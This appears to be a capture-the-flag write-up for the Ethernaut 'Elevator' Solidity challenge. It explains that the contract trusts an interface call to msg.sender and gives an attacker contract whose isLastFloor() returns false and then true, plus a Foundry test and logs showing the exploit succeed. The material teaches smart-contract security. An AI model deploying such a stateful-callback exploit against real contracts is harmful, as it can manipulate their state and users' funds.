# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)

<br>

# What You're Supposed to Do?

in `11-Elevator` Challenge, You Should Try To find a Way to Go to Top of the Building Successfully Using the Elevator.

`11-Elevator` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)

<br>

# How did i Complete This Challenge?

<br>

I made a little change `Elevator` Contract Which Just Changed Interface Name from `Building` to `IBuilding`.

So Now Looks Like This:

```javascript
    interface IBuilding {
        function isLastFloor(uint256) external returns (bool);
    }

    contract Elevator {
        bool public top;
        uint256 public floor;

        function goTo(uint256 _floor) public {
            IBuilding building = IBuilding(msg.sender);


            if (!building.isLastFloor(_floor)) {
                floor = _floor;
                top = building.isLastFloor(floor);
            }
        }
    }
```

When We Analyze the `Elevator` Contract, We See that it uses an interface. Right Away, You Should Ask Yourself: What's The Purpose of Using Interface in This Contract or Even in Soliidty?

One of the Main Reasons is to Interact With Smart Contracts Specific Functions But Using Less Gas.

Now When You See This line: `IBuilding building = IBuilding(msg.sender)`, it means the `msg.sender` is a Contract, Which We Use a Interface to Interact with `isLastFloor()` function.

Now This `isLastFloor` Function it Should Work in a Way to Successfully Pass the If Statement. Since `isLastFloor()` Returns a Boolean Value and the If Statement itself Requires the
condition to be `true`, in order to Execute Rest of the Code, this Indicates that returned value from `isLastFloor()` function, should be `false` and then we flip it back to `true` When
we use `!` with `false`. (`if (!false == true) {execute rest of the code}`)

Now What the Contract Should do is return `true` if it's Last Floor of the Building and return `false` if it's not. (kinda)

But One thing You Probably Didn't Notice is, if the `_floor` number we pass in, is actually the Last Floor of the Building, it will return `true` and When We Combine `!` with `true` (`!true`) it will flip back to `false` which the condition of the if statement will be `false`, resulting in Not Executing the Rest of the code inside the if statement.

What Attacker Can do Here is, if `_floor` number is Passed in is the Last Floor, Return `false` first time, so the code inside the if statement get's executed and return `true` second time
if the `_floor` Number Passed in, is The Last Floor of the Building.

So Basically We Want this Line `if (!building.isLastFloor(_floor))}` condition equals to `true` by `isLastFloor()` function returning `false` and `top = building.isLastFloor(floor)` to be
`true`.

So it looks Like this:

```javascript
    if (!building.isLastFloor(_floor)) {    
        floor = _floor;
        top = building.isLastFloor(floor);
    }

    if (!false) {    
        floor = _floor;
        top = true;
    }
```

Attacker Can Use Similar Contract Like This In Order to Go Top Of the Building Successfully:

```javascript
    contract Building is IBuilding {

    Elevator elevator;
    uint256 public lastFloor = 10;
    bool isFirstCall = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function useElevator(uint256 _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) external returns (bool isLastFloorBoolean) {
        if (_floor > lastFloor) {
            revert("This Building Only Has 10 Floors");
        }

        if (_floor != lastFloor) {
            isLastFloorBoolean = false;
        } else if (_floor == 10) {
            if (isFirstCall) {
                isFirstCall = false;
                return false;

            } else if (!isFirstCall) {
                isFirstCall = true;
                return true;
            }
        }
    }
}
```


Here's the Test i Wrote inside the `Elevator.t.sol` Which You Can Run to Exploit the `Elevator` Contract:

```javascript
    function testElevatorIsWorkingCorrectly() external {
        Building building = new Building(elevator);
        
        console.log("The Last Floor in this Building is 10.");
        console.log("Lets Use Elevator To Go To Floor 3.");

        building.useElevator(3);

        console.log("We Are Currently On Floor: ", elevator.floor());
        assertEq(elevator.floor(), 3);
        console.log("is This the Top of the Building? ", elevator.top());
        assertEq(elevator.top(), false);


        console.log("Hmm... i Changed my Mind, Lets Go To Top of the Building, Floor 10.");

        building.useElevator(10);

        console.log("We Are Currently On Floor: ", elevator.floor());
        assertEq(elevator.floor(), 10);
        console.log("is This the Top of the Building? ", elevator.top());
        assertEq(elevator.top(), true);
    }
```

You Can Run it with Command Below:

```javascript
    forge test --match-test testElevatorIsWorkingCorrectly -vvvv
```

Take a Look at the `Logs`:

```javascript
    Logs:
        The Last Floor in this Building is 10.
        Lets Use Elevator To Go To Floor 3.
        We Are Currently On Floor:  3
        is This the Top of the Building?  false
        Hmm... i Changed my Mind, Lets Go To Top of the Building, Floor 10.
        We Are Currently On Floor:  10
        is This the Top of the Building?  true
```
